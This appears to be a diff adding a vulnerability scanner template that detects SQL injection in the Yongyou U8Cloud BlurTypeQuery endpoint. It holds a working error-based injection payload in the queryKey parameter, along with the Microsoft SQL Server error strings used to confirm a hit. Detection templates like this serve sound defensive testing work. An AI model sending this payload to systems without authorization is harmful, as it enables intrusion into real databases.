@@ -1,0 +1,23 @@
+id: yongyou-u8cloud-blurtypequery-sqli
+info:
+  name: Yongyou U8Cloud BlurTypeQuery SQL Injection
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: sql-injection
+  description: |
+    Detects SQL Injection vulnerability in Yongyou U8Cloud BlurTypeQuery endpoint.
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/servlet/~iufo/nc.itf.iufo.mobilereport.data.BlurTypeQuery?queryKey=1%27)or(1=@@version)--+"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "nvarchar"
+          - "Microsoft SQL Server"
+          - "转换成数据类型 int 时失败"
+        condition: and
